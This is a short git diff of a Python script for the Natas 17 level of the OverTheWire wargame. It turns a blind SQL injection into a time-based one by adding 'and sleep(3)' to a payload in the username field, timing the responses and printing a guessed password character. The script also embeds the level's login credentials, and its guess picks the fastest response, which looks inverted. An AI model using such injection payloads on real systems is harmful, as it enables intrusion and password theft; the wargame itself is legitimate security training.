@@ -13,8 +13,14 @@ session = requests.Session()
 session.auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
 payload = {'username': ''}
 
+time_list = []
+
+
 for c in pass_charset:
-    payload["username"] = 'natas18 and strcmp(BINARY substr(password, 1, 1), "{}") = 0#'.format(c)
+    payload["username"] = 'natas18 and strcmp(BINARY substr(password, 1, 1), "{}") = 0 and sleep(3)#'.format(c)
     res = session.post(URL, data=payload)
-    print(res.elapsed.total_seconds())
+    time_list.append(res.elapsed.total_seconds())
+
+print("guessed char: {}".format(pass_charset[time_list.index(min(time_list))]))
+
 
